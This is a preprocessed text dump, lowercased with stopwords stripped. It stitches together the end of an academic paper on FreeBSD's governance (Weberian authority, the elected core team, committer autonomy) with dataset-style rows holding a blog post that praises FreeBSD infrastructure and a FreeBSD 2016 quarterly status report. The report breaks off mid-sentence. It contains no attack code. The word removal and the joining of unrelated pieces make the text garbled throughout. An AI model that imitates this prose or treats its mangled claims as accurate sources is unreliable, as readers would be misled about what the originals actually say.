receives another mintzberg p similarly freebsd committers coordinate term definite performance standard expected commit change break build business effectively accommodate increased scale project proceeded series measure first started using quarterly status report give contributor overview various development activity progress second onwards increasingly development activity migrated cv perforce later subversion revision control environment environment superior support parallel development perforce replaced cv development site experimental feature subversion server development work src tree currently taking place freebsd long watson third project tried decouple work different group committers organising development important new feature independent subprojects project manager holck p way experimental feature developed perforce revision control environment merged main repository mature enough long fourth project placed great importance upon developer event encouraging contributor attend fact one activity freebsd foundation set event sponsorship period role responsibility increasingly decoupled individual committers delegated team informal governance phase take one example one person satoshi asami known mr port among freebsd developer responsible entire port collection replaced port management team similarly position security officer expanded security officer team freebsd machine administered first phase two three person admin team formed purpose latter phase informal governance phase public relation entrusted one person freebsd president responsible interfacing corporate contact following abolition presidential position task picked marketing team since founding freebsd foundation every change enumerated far systematisation rule procedure formation administrative team charged task formerly carried one person attests contingent relationship governance structure scale maturity fo project imperative autonomy although adoption elective principle altered mode project governance affect work organisation committers process change integrated repository remained main feature ability committers integrate change directly repository change possible given dramatic increase participating committers time expansion scale result supervisory hierarchy word autonomy committers enjoy accounted first place developer come work freebsd offer substantial control work thus indicating governance structure development process important motivating factor p survey seventytwo freebsd committers eighty percent said encouraged freedom commit code directly repository feel whim single person p see also bearing mind freebsd historical background significance developer attribute autonomy hardly surprising freebsd descended via bsd unix developed radically informal antibureaucratic fashion btl withdrew multics project whose aim development multiuser operating system btl employee took upon bootstrap without support employer unix born development beginning autonomous btl dispensing supervision however served strengthen feeling solidarity among growing number user american university turning thus development unix truly collaborative enterprise pfaffenberger raymond ritchie salus subsequent development bsd berkeley campus university california similarly shunned bureaucratic principle organisation pioneering model revolved around group programmer called committers account power make change codebase committers group people trusted commit notion autocratic need tell people administratively keep thing set culture well structure mckusick quoted leonard addition animating development unix bsd principle autonomy focal model internet governance evolved hacker community prototype model internet engineering task force ietf formed closest thing institution responsible development internet standard founding belief follows reject king president voting believe rough consensus running code clark hoffman deciding whether adopt reject standard rough consensus mean unanimity required strongly held objection must debated people satisfied objection wrong hoffman practice though fixed percentage proposal accepted support le ninety percent working group bradner similarly freebsd committer joseph koshy say formal specification design document seldom wellwritten code wellwritten change log used place freebsd development happens consensus running undeniably modern advance communication technology particular massive diffusion internet revolutionised scope decentralised software development enabling far greater number people ever participate project like freebsd however though role internet bridging geographical distance slashing communication cost overlooked suffice provide adequate interpretation course action freebsd took respond increased scale internet enables new organisational configuration determine authority distributed way question governance organisation fo project decided intimately related moral belief organise effectively analysis historical cultural context freebsd development embedded brings sharp focus broader normative standard reference hacker act show motive autonomy attributed conduct freebsd developer accord recognised normative pattern freedom commit change directly repository make sense term accepted norm imperviousness taking order role autonomy organising norm explains dramatic increase committers lead introduction supervisory hierarchy exercise authority fo project understood apart influence normative standard autonomy circumstance conduct bearer administrative authority core team case freebsd allowed infringe upon developer autonomy action making thus impossible adoption organisational configuration seem contravene fundamental principle authority legitimacy max weber classic analysis source legitimisation authority provides lens historical transformation freebsd governance structure viewed according weber pp authority system stable unless based belief subject legitimacy subordination distinguishes three type legitimate authority first type legal legalrational authority case obedience owed legally established impersonal order weber p subject legal authority owe personal allegiance superordinate follow command within restricted sphere jurisdiction clearly specified giddens p person authority occupy position office appointed organisation hierarchical lower office control supervision higher one weber p traditional authority based sanctity ageold rule power handed past exercised village elder small rural community charismatic authority weber third type recognised subject interlaced extraordinary ability leader virtue endowed supernatural superhuman least specifically exceptional power quality weber p type belongs authority exercised example prophet religious leader follower hero war claim legitimacy charismatic authority founded upon belief authenticity uniqueness leader mission supply proof prodigious feat hence prophet perform miracle war hero triumphant military exploit administration group subject charismatic authority carried official leader disciple share charisma thing career promotion salary benefice call mission spiritual duty leader administrative staff summoned charismatic mission hierarchy leader merely intervenes considers member staff inadequate task entrusted system formal rule precedent handed past genuine prophet like genuine military leader every true leader sense preaches creates demand new obligation weber p general rule fo project created tradition guide inherit traditional basis authority mahony ferraro p rely upon legalrational basis authority either authoritative division labour authority validated tradition hierarchy justification often turn charisma bearer leadership unix without doubt charismatic character early development inception development unix closely connected name ken thompson dennis ritchie recognition important role making unix risen mythical status hacker folklore fo literature tendency present individual endowed extraordinary ability eg raymond charismatic quality attributed successor bill joy coordinated subsequent development unix berkeley one berkeley colleague describes infectious enthusiasm would get people around stuff mckusick quoted leonard rule charisma however ephemeral disdain routine everyday impossible charisma survive unless undergoes profound modification routinisation therefore implies devolution charismatic authority hard discern occurrence transformation bsd project already counted five year development time bill joy arrived berkeley attend graduate school spearheaded software development effort culminating became known bsd stepped wake departure sam leffler joy secondincommand took responsibility completing release appointed joy post team graduate student staff researcher working bsd berkeley known since computer science research group csrg short felt slighted salus soon left lucasfilm following release august leffler replaced another member csrg mike karels joined kirk mckusick december leadership project evolved organisational structure core team centre wider base committers surrounding leonard type authority relationship emerges routinisation charisma according weber determined large part succession problem resolved case bsd successor nominated predecessor selfselected spite professed willingness take leader role leffler appointed position csrg soon stepped contrary fitness substitute position mike karels well kirk mckusick validated designation csrg issue succession raised bsd karels mckusick project coordinator twotier organisational structure began take shape leadership rather vested single person entrusted selfselected group heavily involved developer set stage important reinterpretation charismatic principle instead restricted person project leader gift grace extended leading cadre hardcore developer freebsd inherited conception charismatic authority bsd along organisational template freebsd project launched core team included thirteen individual development freebsd based group programmer called committers ability make change codebase committers organised informal meritocracy active committers invited core team join rank outside contributor regularly sent useful patch offered commit right granting commit right outside contributor amounted recognition technical expertise patch demonstrated similarly inviting committer join core team reflected recognition outstanding contribution freebsd brilliance coding authority derived technical competence acquired demonstrated participation project although conception merit project change criticism selection process core team prerogative became virulent time thrust one hand core team degenerated gerontocracy veteran freebsd developer longer reflected merit project member core team abused power serve end prominent committer announced intention quit project core team member trampling work criticism core team turned open conflict rapidly took alarming proportion intervention one project founder point decisive importance suggested number alternative reform called committers vote responded call deciding vote adopt elected core team model core bylaw drafted shortly thereafter regulate election transformation charisma set application elective principle core team selection case fuelled rupture committers core team conflict manifested growing criticism distribution authority project brought shift governance toward electoral process selection core team result core team whose legitimacy rested member charisma became core team thanks confidence committers introduction elected core team member entailed radical alteration position became servant authority passage leadership selfselected group freely elected one signified committers free elevate power depose pleased whereas recognition charisma core team far perceived committers consequence legitimacy began considered basis legitimacy sense democratised reconfiguration governance system brought transformation charisma limited authority core team four important way first sphere authority circumscribed role core team restricted managing commit privilege mediating event serious disagreement committers second made accountable community committers core team required defer wish making decision reflect consensus opinion committers manifest mailing list third term office specified new election held every two year fourth project leadership became revocable core bylaw invested committers power trigger early election thereby recalling core team trait correspond type governance weber call direct democracy short term office liability recall restricted sphere jurisdiction obligation render accounting general community committers submit every important question weber pp direct democracy characteristic group order preserve member autonomy attempt dispense leadership altogether reducing minimum control men others sense directdemocratic form governance inherently antiauthoritarian weber p freebsd specifically antiauthoritarian transformation charisma culminated adoption directdemocratic mode governance limited authority core team introduction element democratic legalrational rule principle consensusoriented decision making limited duration office liability recall institutional safeguard drawing justification sovereignty committers premise delimiting authority core team specifying sphere jurisdiction hand bureaucratic par excellence authority bureaucratic organisation distributed legitimised within particular sphere office weber p authority core team likewise restricted specific field exercised matter touching commit right committer dispute freebsd use socalled hat project assigning clearly circumscribed area responsibility certain committers also indicative strippeddown form bureaucratisation tendency toward formation team take role formerly held single committer eg port management security officer team weber p remarked antiauthoritarian direction transformation charisma normally lead path rationality setting administrative organ function reliably invariably involves systematisation rule procedure fuelling thus progressive bureaucratisation group yet authority core team belong bureaucratic type bureaucracy understood clearly defined hierarchy office weber p core team member bureaucratic type since officer core team core team member integrated hierarchical order superior influence promotion core team supervise activity contrast bureaucratic organisation mobilise member remunerative incentive participation freebsd voluntary unwaged although many committers professional industry involvement freebsd regarded career conventionally understood career advancement freebsd outside contributor become committers committers core team member hardly analogous moving multilayered hierarchy rank fact aim freebsd governance system eliminate division labour separate decision making labour administrative task executive labour performance task core team addition managerial duty expected producing code crucially decision making rest consensus process project member participate decision taken binding legitimate must carry consensus group behind ensure committers participate process formulating problem negotiating decision issue discussed project mailing list weber differentiates bureaucracy form organisation allows regular control operation time view make bureaucracy rational according foucault whose work deal extensively theme timespace control distinguishing feature bureaucratic organisation whether school barrack factory hospital use individual time space constantly monitored controlled every individual assigned proper place certain duty perform particular moment type administrative authority foucault say connects discipline directly utility goal ensure use individual time channelled solely activity administrator consider useful contrast participation freebsd subject form control project keep record time committers dedicate committers participate free time deciding work long moreover geographical whereabouts irrelevant may work freebsd privacy home place seen standpoint timespace control freebsd wholly dispenses discipline characteristic bureaucratic administration attempt ever made project supervise individual activity committers control mean use time space divergence freebsd bureaucratic model also illustrated form social relationship project social relation bureaucratic organisation based formal role held member laid authoritative division labour relationship freebsd developer far holistic affective personal committers freebsd community fraternity peer bureaucratic organisation separate official personal two dimension fuse together ideal community freebsd aspires neil p weberian term orientation social action freebsd valuerational social conduct based definite moral value action individual directed overriding ideal part hacker community coalesces around development freebsd cf torvalds say action informed pragmatic consideration chiefly want fruit labour used many people possible hubbard relationship people freebsd typical collectivelyrun volunteer organisation rothschildwhitt p seen value arguably account holding office core team member recognised figure authority although opinion may well carry weight discussion occurring project mailing list committers result power office rather respect trust given committers substantial contribution project prior study shown collectivist organisation find inequality influence acceptable circumstance exercise power exercise interest others usually interest identical others mansbridge p hence reason committers accept exert influence others influence seen compatible interest trace charismatic authority still detected relationship trust committers core team member certain extent emotional type persuasive authority core team member legitimised mainly recognition authenticity technical charisma committers weber transition autocratic selection core team democratic election vote signal end charismatic rule subjection norm rule invariably involves loss genuine charismatic authority charisma abhors permanent form organisation formal rule claim legitimacy lie conception duty subject charismatic authority recognise uniqueness act accordingly weber pp conception authority longer representative freebsd election core team amongst committers resulted changing basis legitimacy recognition charisma longer treated committers consequence legitimacy authority basis upon rest legitimacy formerly rested duty committers recognise technical charisma core team became democratic latter period application elective principle authority core team longer validated charisma member committers legitimacy thus democratised routinisation charisma freebsd resulted directdemocratic governance system distribution authority validated committers although type governance includes element bureaucratic authority authority core team delimited mechanism reinforce bureaucratic value functional specificity authority source legitimacy fundamentally democratic justified imperative preserve sovereignty committers rather adherence impersonal hierarchical order important observe transformation charismatic democratic authority modify conception merit project remains anchored technical competence acquired demonstrated project participation changed markedly however conception leadership leadership longer conceptualised informal rule selfselected group heavily involved committers democratically elected group committers revocable subject formal rule conclusion analysed freebsd institutional evolution distinguishing two phase based corresponding mode governance freebsd formal mean representing contributor project governance leadership consisted selfselected group veteran committers growing criticism distribution authority project brought shift toward elected model according project leadership exercised nine person elected biennially amongst committers considering dramatic increase committers time transformation governance system systematisation rule procedure run parallel suggests project governance structure contingent upon scale maturity transformation governance system however affect mode work organisation committers development process spite remarkable expansion scale organisation theory predicts group grows larger becomes le able selforganise compelled turn supervisory hierarchy mean coordination expansion committers group accompanied change direction rather project resorted standardising induction process new committers b output frequent building line development understood apart influence normative standard individual autonomy action accounted bearing mind important reason hacker attracted freebsd freedom committers add change directly repository centrality autonomy principle elucidates intervening motivational link observed activity course action freebsd took manage increased scale achieve work coordination within expanding group meaning actor involved basic principle hacker ethic mistrust authority promote decentralization levy hacker espouse view ultimate effect centralised authority strangle creative potential inherent selfregulating individual thereby acting check upon free development activity hacker driven acute sense independence conceivable would adopt organisational configuration contravene autonomy normative significance individual autonomy explains authority fo project coercive naturally say authority exists freebsd consists control ability make change codebase considering authority relationship stable unless recognised submit based legitimate order weber examined authority legitimised freebsd contrasting weber category legitimate authority found legitimacy shifted quasicharismatic authority selfselected group heavily involved committers democratic authority elected group revocable bound formal rule however none weber category capture sufficiently character authority freebsd authority defined relationship actor obeys specific command issued another weber p defines freebsd essentially organisation without authority thing giving following order freebsd administrative organ project core team tell committers decision need made made collectively consensus weberian tradition take basis authority decisive organisational feature mode organisation freebsd collectivist based directdemocratic procedure decision making seen perspective division labour project freebsd decentralised antihierarchical task selfselected committers need interest best dictate resulting division labour spontaneous sense emerges choice committers rather central designer rejection supervisory hierarchy analogous autonomy managerial control professional enjoy account expected exercise judgment discretion daily work fundamental difference professional working organisation even adhocratic one invariably subject measure hierarchical control bendor et al p hacker totally ousted hierarchical authority organisational frame committers work without supervision shouldering ultimate responsibility modification make codebase adequately tested clash work committers consequently freebsd illustrates production process rely manager hamel p freebsd work also manage close study seems appropriate ask whether mode work organisation likely spread economic sector attempt answer must take consideration two characteristic specificity fo first mean fo production computer software tool widely distributed certainly case many field human industry tool human use work create equally accessible second participation fo project contributor lie outside realm labour determined necessity livelihood vast majority fo developer depend fo work participate voluntarily free time people contrast work activity borne necessity need food clothes shelter without life perishes dy force work relationship otherwise would never accepted looked perspective ability participate fo production community broadly peer production project appears luxury available privileged sense peer production adaptation scarcity abundance raymond p individual engage peer production reason immediate survival goal satisfy intellectual rather material need highly improbable member peer production project would able enjoy equality decision making autonomy action fact economically independent could actual condition people today forced follow command sake money participative nature peer governance requires participant bound relation economic dependence thus effectively precludes generalisation mode governance existence huge disparity economic power contemporary society consequently without eradication milieu peer production doomed island libertarian culture sea authoritarian organisation acknowledgement based author doctoral research delft university technology note subsequent analysis focus src committers alone choice made ground two area work freebsd port documentation pertain le new code development peripheral though necessary activity survey seventytwo freebsd committers constituting thirtyfive percent committers conducted eightysix percent said received feedback two reviewer build automated process humanreadable source code compiled executable program compilation fails build said broken survey seventytwo freebsd committers constituting thirtyfive percent committers conducted said last task worked largely team consisting committers representing employ term governance refer use institution structure authority even collaboration allocate resource coordinate control activity bell project employment akin used international relation context government typically authoritative fact governing traditional sense much setting parameter voluntary relationship among autonomous party weber p core bylaw make normally understood term constitution specify mode election duration incumbency unlike constitution make reference principle core team shall established manner shall organised power shall save establishing right committers recall core team triggering early election question dealt document released project example freebsd committers big list rule clarifies authority core team restricted task managing commit privilege aspect project operation core subset committers bound rule someone core mean special dispensation step outside line painted core kick act group individual basis individual core team member committers first core second freebsd whole question related distribution authority project still epicentre conflict instance reason decision made consensus lie formal rule forbidding core team making decision autocratically vigorous resistance committers core team decision regard conflicting lehey active considered committers made least one commit last twelve month goal smp project introduce parallelism kernel freebsd could run multiprocessor computer hardware architecture skill standardized kind training required perform work specified mintzberg p part process formalised since freebsd website outline exact step wouldbe mentor must follow propose new committer freebsd organisation generally refuse legitimate use centralized achieve social control commonly resort selection homogeneity shown rothschildwhitt pp classic study collectivist organisation homogeneity course reinforced selfselection characteristic participation collectivist organisation mansbridge p result daily build process accessible online http tinderboxfreebsdorg indicatively june tinderbox machine performed build current version six officially released version freebsd nine different hardware platform according one project founder developer event contribute relationshipbuilding effective conflict management hubbard port management team currently number eight member security officer team currently number eleven member discourse influential shaping contemporary theorising hold itenabled organisation enlarge scale whilst retaining advantage flexibility peculiar small organisation classic literature stream see castells malone laubacher tapscott currently leffler freebsd committer member freebsd foundation board director weber recognised possible type authority deprived monocratic character bond single person principle collegiality weber p indicatively survey seventytwo freebsd committers constituting thirtyfive percent committers conducted said employer paid part time spent latest code contribution one may wonder possible developer relation freebsd personal given interaction occur predominantly computer environment long distance relationship seem rather impoverished shallow compared relationship based physical copresence instructive connection refer emphasis marshall mcluhan laid diffusion electronic telecommunication would transform globe global village signalling return humanity tribalesque form sociality mcluhan effect telematic technology social interaction profound scope longer determined geographical proximity affinity becomes possible relation remote kind experienced meaningful personal organisational theorist remarked bureaucratic structure unsuitable coordination professional must exercise judgment discretion performance duty work demand decentralised structure designed largely leave people free work know mintzberg mchugh organisational structure often referred literature organised anarchy cohen et al adhocracy mintzberg mchugh work cited andrew j freebsd tinderbox failure kerneltrap feb accessible http bell economic governance institutional dynamic oxford university press bendor j moe shotts k recycling garbage assessment research program american political science review benkler wealth network social production transforms market freedom yale university press biancuzzi f behind dragonflybsd onlampcom accessible http bradner internet engineering task force dibona c ockman ed open source voice open source revolution reilly associate bsd certification group bsd usage survey accessible http castells internet galaxy reflection internet business society oxford university press clark dd cloudy crystal ball vision future plenary presentation meeting internet engineering task force jul cambridge mass cohen march j olsen j garbage model organizational choice administrative science quarterly cusumano selby rw microsoft secret world powerful software company creates technology shape market manages people harpercollinsbusiness demil b lecocq x neither market hierarchy network emergence bazaar governance organization study dillon announcing dragonfly bsd message posted freebsdcurrent mailing list jul accessible http eisenhardt k building theory case study research academy management review foucault discipline punish birth prison random house freebsd committer guide accessible http freebsd new account creation procedure accessible http wwwfreebsdorginternalnewaccounthtml freebsd freebsd committers big list rule accessible http freebsd contributor freebsd v accessible http wwwfreebsdorgdocenarticlescontributors freebsd quarterly status report jun accessible http freebsd new committer guide accessible http garzarelli g galoppini r capability coordination modular organization voluntary fsoss production case debian gnulinux industrial organization econwpa accessible http giddens capitalism modern social theory analysis writing marx durkheim max weber cambridge university press hamel g future management harvard business school press harrison pm weber category authority voluntary association american sociological review himanen p hacker ethic spirit information age vintage hirschman exit voice loyalty response decline firm organization state harvard university press hoffman p tao ietf novice guide internet engineering task force internet engineering task force accessible http wwwietforgtaohtml holck j n check red control meet anarchy two open source project koch ed freeopen source software development idea group holck j n continuous integration quality assurance case study two open source project australasian journal information system special issue hubbard j editorial pulling one end rope freshmeat accessible http freshmeatnetarticleseditorialpullingononeendoftherope hubbard j freebsd performance computing accessible http hubbard j resignation president freebsd project message posted freebsdannounce mailing list feb accessible http n developer autonomy freebsd open source project journal management governance n incremental decentralized integration freebsd feller j fitzgerald b hissam sa kr lakhani ed perspective free open source software mit press pp koshy j building product freebsd version freebsd project accessible http wwwfreebsdorgdocenarticlesbuildingproductsarticlehtml krill p time continuous integration app development infoworld jul accessible http von krogh g von hippel e promise research open source software management science de laat pb governance open source software state art journal management governance lehey g two year trench evolution software project accessible http wwwlemiscomgroginthetrenchespdf leonard bsd unix power people code salon may accessible http levy hacker hero computer revolution anchor pressdoubleday loliqueru e focus freebsd interview core team osnews apr accessible http long perforce freebsd development freebsd project accessible http lucas become freebsd committer onlampcom jan accessible http malone tw laubacher rj dawn elance economy harvard business review mansbridge jt acceptable inequality british journal political science markus l governance freeopen source software project monolithic multidimensional configurational journal management governance mateosgarcia j steinmueller e institution open source software examining debian community information economics policy mcluhan understanding medium extension man mcgrawhill mintzberg h structure five designing effective organizationsprenticehall mintzberg h mchugh strategy formation adhocracy administrative science quarterly mahony ferraro f emergence governance open source community academy management journal neil cyberchiefs autonomy authority online tribe pluto press pfaffenberger b f want ok usenet outer limit free speech information society raymond e art unix programming addisonwesley raymond e cathedral bazaar musing linux open source accidental revolutionary rev ed reilly raymond e brief history hackerdom accessible http wwwcatborgesrwritingshomesteadinghackerhistory ritchie dm evolution unix timesharing system bell laboratory technical journal accessible http cmbelllabscomcmcswhodmrhisthtml rothschildwhitt j collectivist organization alternative rationalbureaucratic model american sociological review saers n project model freebsd project accessible http wwwfreebsdorgdocenbooksdevmodelbookhtml salus ph unix byte accessible http shah motivation governance viability hybrid form open source software development management science slashdot freebsd core developer thrown feb accessible http spinellis global software development freebsd project p kruchten p hsieh macgregor e moitra w strigel ed international workshop global software development practitioner acm press pp tapscott digital economy promise peril age networked intelligence mcgrawhill torvalds l fm interview linus torvalds motivates free software developer first monday accessible http watson r freebsd project work proceeding eurobsdcon milan italy accessible http weber theory social economic organization translated henderson parson free press weber success open source harvard university press
508,Lobsters,freebsd,FreeBSD,Your Infrastructure should be Boring,https://home.apache.org/~dch/blog/2016/10/20/infra-should-be-boring/,infrastructure boring,infrastructure boring boring freebsd infrastructure reliability instead debugging random crap time change freebsd storage openzfs upgrade boot environment port package poudriere homebrew core functionality package infrastructure boring,infrastructure boring oct minute read boringfreebsdinfrastructurereliability imagine every time picked phone make call completely redesigned reinvented button went turn stove instead button knob press something different maybe needed swipe like touch device give special hand gesture imagine different every day work tech know talking already sort stuff infuriating many tool use daily get job done interface working principle change repeatedly get job done instead spend time researching fixing underlying problem sometimes ok free time burn enjoy instead say testing craft beer skiing part get face get frustrated annoyed happens every day get angry maybe customer getting angry maybe family upset fixing computer thing get back work thing planning actually deliver thing promised somebody done read kid story go bike ride spend time partner instead debugging random crap large degree feel current state linux specifically serverside linux want infrastructure boring spend time energy developing improving innovating thing promised need rely able manage change consistently time place choosing whim mercy distribution really want spend free time tracking latest kernel pull additional functionality systemd promptly break stuff changed decade needing openssl update end cascading infinitely expanding vortex doom desperately want first softwaredefined black hole demonstrates requiring package system upgraded version tested application know application entire reason server exists reason user thing paid make choice uptodate security patch tracking reliable version tool use deliver manage business need reinstall system possible setup identical given point time development testing build match actually deployed yet seems last year become case managing infrastructure become job largely necessary sub task shipping great software service time change since using freebsd since mid become main computing platform work server workstation laptop comment could entire blog post drop brief list hope future get around fleshing storage openzfs one killer feature freebsd work art computing world zfs fully featured filesystem inbuilt checksum snapshot rollback interserver replication built superb performance characteristic data worth family photo company record storing zfs sir fool already experienced bitrot premature drive death zfs least know upgrade zfsbased boot environment provide point time fully bootable snapshot o making one instant allows switch back preceding o version simply separate zfs datasets holding application data file need replay transaction log bring restored copy date possible roll back o without touching application data abi compatibility contract kernel user library application freebsd preserve across minor version software built freebsd run without modification necessary rebuild application o binary bumped kernel userland developed together first really appreciate significance horrific experience debian apthell update get freebsd project get closer releasing next version whole kernel userland tested together people like application completely separate upgrade one without impact linux updating next debian release grab new kernel also pull random wedge dependency may may anything resolving security exposure presumably main reason update first place result application break feature roll forward comfortable ability roll o back needed also sure application impacted port package poudriere huge fan osx project called homebrew usercontributed repository install packaging script thousand open source tool project idea new come port tree available bsd derived operating system massive repository opensource software specifically set tweaked patched particular operating system entire setup based standard bsd makefiles nice homebrew rubybased dsl powerful addition developer adding missing package library take hour case port tree available subversion git repository carrying patch waiting go review commit pipeline straightforwards freebsd introduced new flexible binary package deployment system support custom package repos easily using publically available one let use prior version software needed use custom private package containing secret sauce poudriere build framework us port jail build requested package source clean room jail produce new binary package repository support option flag port tree producing custom package piece cake together mean holy trinity sysadmin software management repeatable build using port poudriere consistent deploys using binary package full source control custom change yes possible linux get complicated messy quickly find veritable peat bog complexity trying put together incomplete documentation blog post core functionality package clear dividing line core functionality party tool linux distribution think clustering failover technology partially dependent party component tested maintained together could tell happens kernel updated userland component may seem like arbitrary philosophical choice experience systemd influx shown important choose replace default syslog ntpd freebsd sure exactly interface need duplicate implement however depending exactly linux kernel distribution specific functionality may subsumed systemd surprisingly complicated example newer version systemd include dhcp server change permission hardware device allow creating user include new console driver may may considered distro release prepared even reverse functionality removed distro relies issue crop test production take time energy manage area software stack u spend little time track changed systemd version understand implication trying ship software portable across distros need manage intricacy sort variation across may find consoled come gone log management done differently functionality rely spawn daemon may exist one release another need upgrade kernel close security risk one main reason upgrade day avoid remote code exploit privilege escalation avoid change end trying manage fact causing chaos production endless delay testing basic functionality option sound le painful linux never clear separation kernel core userspace functionality daemon needed provide working operating system third party library uncoordinated chaos sad inevitable result distro distro across varying version kernel supplied tool basic functionality like logging service management network funtionality generates staggering amount unnecessary rework infrastructure boring comparison found freebsd resulting platform stable manageable minimal effort dependent leadingedge kernel feature available currently deployed fleet o chimaera partially tested combination party tool filesystems linux kernel next major release development easily move build pipeline alpha beta release candidate build test final release announced month testing upgrading reasonably safe knowing trusted rollback zfs boot environment away unlikely event something unexpected turn think freebsd platform building robust repeatable service core functionality built necessary simple make change build roll flexible operating environment running service kernel hodgepodge extra package seemed good choice rime maybe give try
509,Lobsters,freebsd,FreeBSD,"FreeBSD Quarterly Status Report - July, 2016 - September, 2016",https://www.freebsd.org/news/status/report-2016-07-2016-09.html,freebsd quarterly status report july september,introduction freebsdorg portmgrsecretary freebsdorg portmgr freebsdorg open task core freebsdorg deb freebsdfoundationorg http wwwfreebsdfoundationorgdonate http wikifreebsdorgtransportprotocols http wikifreebsdorgdtrace http wwwfreebsdfoundationorgfreebsdhowtoguides http http http http wwwfreebsdfoundationorgpastissuesfreebsdandrtems http wwwfreebsdfoundationorgnewsandeventsnewsletter http http hopenetindexhtml http http fossconus http womencourageacmorg http wwwsniaorgeventsstoragedeveloper http http kirkmckusick http georgenevilleneil http openzfsorgwikiopenzfsdevelopersummit http wwwfreebsdfoundationorgblogfreebsdfoundationwelcomesnewboardmembers allanjude freebsdorg bapt freebsdorg cem freebsdorg emaste freebsdorg oshogbo freebsdorg olevole olevoleru pfsense opnsense bsdrp freenas zfsguru clonos bhyve xen vale jail cbsd puppet open task ed freebsdorg cloudabidevel googlegroupscom open task mav freebsdorg open task freebsdorg mmacy nextbsdorg mecom emaste freebsdorg open task lwhsu freebsdorg gonzo freebsdorg open task mav freebsdorg avg freebsdorg wulf cicgroupru gonzo freebsdorg open task jan semihalfcom jpa semihalfcom open task sepherosa gmailcom honzhan microsoftcom decui microsoftcom kyliel microsoftcom kib freebsdorg gavin freebsdorg pfg freebsdorg open task freebsdorg open task vmaffione gmailcom open task jan semihalfcom mst semihalfcom wma semihalfcom mw semihalfcom bsz semihalfcom open task andrew freebsdorg jmcneill freebsdorg kib freebsdorg kde freebsdorg olivierd freebsdorg jesper schmitzcomputer open task xfce freebsdorg open task sevan freebsdorg mandoc unix heritage society manual library catvorg research unix open task news home status home,introductionas focused present happening sometimes useful take fresh look come going quarter newest doc committer working trace tangled history many utility also get glimpse looking forward may come freebsd finalized period covered report still anticipatory excitement feature coming possibility tantalizing base system gpl component architecture capsicum protection common utility cloudabi custom software fewthe work present le exciting making way end new core coming much read find kadukplease submit status report fourth quarter january contact freebsd release engineering team freebsdorg freebsd release engineering team responsible setting publishing release schedule official project release freebsd announcing code freeze maintaining respective branch among thing freebsd release engineering team continued cycle planned released september result several lastminute issue final release announcement delayed project sponsored freebsd foundation contact rené ladan portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg port tree currently contains port pr count around pr unassigned last quarter saw commits active committers compared preceding quarter slight increase number pr number unassigned pr slight decrease number committers last quarter four commits bit taken safe keeping erwin miwi sem left request jase inactive month welcomed two new committers tobias berner tcberner joseph mingrone jrm management side erwin miwi left portmgr bapt also left portmgr still liaison core infrastructure side three new us grantlee kde linux one new keyword javavm introduced default version linux port centos fedora port scheduled removal end year license framework extended none license indicate port clearly defined licensing term port package distribution file distributed also support complete set creative common license added major uservisible port updated firefox firefox extended service release chromium default version gcc pkg behind scene antoine ran expruns validate various package update framework change change base system bdrewery added two new package building machine supervised package build added support building package eurobsdcon rene visited presentation landry breuil landry openbsdorg explaining package built openbsd world explaining various design decision open task spare time please take pr testing committing contact freebsd core team core freebsdorg third quarter started handover ninth core team took office four member returning previous core baptiste daroussin ed maste george nevilleneil hiroki sato one returning member term away john baldwin four member new core allan jude kris moore benedict reuschling benno rice new core team represents ideal balance experience fresh blood beyond handing ongoing business reviewing everything core agenda routine changeover activity first action new core respond query craig rodrigues concerning hardware supplied project donation freebsd foundation used foundation keep record hardware supplied time idea original purpose hardware provisioned track current usage project hardware asset cluster administration keep configuration database suitable general publication cover much foundation supplied equipment discussion decided updated information current disposition foundation supplied equipment incorporated foundation annual report ensuring freebsd code base supplied open unencumbered licensing term infringe patent term otherwise act counter legal requirement core primary concern quarter three item nature importing concurrency kit consultation foundation legal counsel determined importing selected part concurrency kit acceptable approved proposal create shadow toolchain repository put community ultimately whole idea rendered largely redundant faster anticipated progress external toolchain port package architecture llvm yet sufficiently mature concern raised handling gpl code work progress linuxkpi shim issue related freebsd svn repository core would like stress care must taken avoid license infringement plan write set guideline handling gpl code item absorbed largest portion core attention quarter concern project handling security vulnerability bspatch libarchive freebsdupdate portsnap partial fix applied lack fix libarchive code yet available upstream secteam receives privileged early report many vulnerability consequently strict policy commenting publicly advisory patch published early access information vulnerability contingent ability avoid premature disclosure without could security advisory patch ready go immediately vulnerability published however case vulnerability already public lack official response freebsd project leading concern amongst user critical press coverage core stepped published statement clarifying situation particular difficulty involved securely modifying mechanism used deliver security patch core belief prompt notification discussion implication possible workarounds public vulnerability wait availability formal o patch openssh project deprecated dsa key upstream freebsd kept dsa key enabled later release compatibility reason release time come synchronize upstream since numerous dsa key use freebsd cluster necessitated exercise get replacement key installed core would like thank david wolfskill account team handling surge key change great deal aplomb quarter welcomed michael zhilin imre vadasz steve kiernan toomas soome new source committers period said farewell martin wilke erwin lansing handed commit bit wish well future endeavour hope see return soon contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage software development project conference developer summit provide travel grant freebsd contributor foundation purchase hardware improve maintain freebsd infrastructure publishes freebsd white paper marketing material promote educate advocate freebsd project foundation also represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter fundraising effort work funded donation spending budget raised far financial report posted early november see need donation continue supporting freebsd current level please consider making donation http wwwfreebsdfoundationorgdonate o improvement foundation improves freebsd funding software development project approved proposal submission process internal software developer staff member two foundationfunded project continued last quarter one project port netbsd blacklistd daemon related element freebsd second phase two port foundation staff member responsible many change quarter kostik belousov accomplished work last quarter provided kernel support efi runtime service call implemented gettimeofday purely userspace hpet timer implemented fdatasync improved locking time keeping code made sleepqueue code immune rapid callout change made many stability fix important ufs issue bug improved process management ptrace code ed maste project development director accomplished work last quarter worked issue cavium thunderx deployment including rmas worked upstream developer test work progress prepare lld replacement linker freebsd base system switched using llvm libunwind base system improved reproducibility build freebsd base system port reviewed blacklistd work progress attended bsdcam primary focus toolchain discussion participated ongoing capsicum call helped capsicumization several base system utility fixed number elf tool chain issue integrated new upstream version freebsd base system hosted biweekly graphic call coordinate work progress funded volunteer developer implemented fix security issue freebsd update tool coordinated integration stable release branch george nevilleneil continued hosting biweekly transport conference call note http wikifreebsdorgtransportprotocols biweekly dtrace conference call note http wikifreebsdorgdtrace release engineering foundation staff member glen barber worked release engineering team continue finalizing cycle delayed address several lastminute issue part cluster administration team glen worked amazing onsite staff nyi rack install two cavium thunderx machine one used native package build architecture targeted used reference machine freebsd infrastructure getting started freebsd project hired summer intern experience freebsd linux commandline operating system figure install use freebsd wrote easytofollow howto guide help make newuser experience straightforward positive submitted bug report 